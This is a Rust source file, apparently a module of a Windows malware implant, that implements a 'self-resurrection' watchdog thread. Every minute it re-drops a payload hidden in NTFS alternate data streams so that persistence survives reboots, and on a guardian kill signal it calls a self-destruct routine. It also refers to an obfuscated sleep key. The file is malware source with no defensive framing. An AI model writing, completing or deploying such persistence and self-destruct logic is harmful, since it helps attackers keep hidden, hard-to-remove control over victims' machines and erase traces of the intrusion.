//! watchdog.rs — Self-resurrection watchdog thread
//!
//! Spawns a background thread that periodically checks whether the implant
//! process is still alive (or whether persistence needs re-seeding).
//! If the guardian flags a kill condition, hands off to full_destruct().

#![allow(dead_code, non_snake_case)]

use winapi::um::synchapi::Sleep;

/// Interval between watchdog heartbeat checks (milliseconds).
const WATCHDOG_INTERVAL_MS: u32 = 60_000; // 1 minute

/// Background watchdog loop — never returns.
///
/// Behaviour:
///   1. Sleep for WATCHDOG_INTERVAL_MS.
///   2. Re-drop ADS payload so persistence survives a reboot.
///   3. If guardian signals shutdown, call full_destruct() and exit.
pub unsafe fn run(sleep_key: &[u8; 16]) -> ! {
    loop {
        Sleep(WATCHDOG_INTERVAL_MS);

        // Re-seed ADS persistence so the payload survives reboots.
        crate::resurrect::drop_from_ads();

        // Check guardian kill flag.
        if crate::guardian::should_terminate() {
            crate::selfdestruct::full_destruct();
        }

        let _ = sleep_key; // used by caller for obfuscated sleep
    }
}
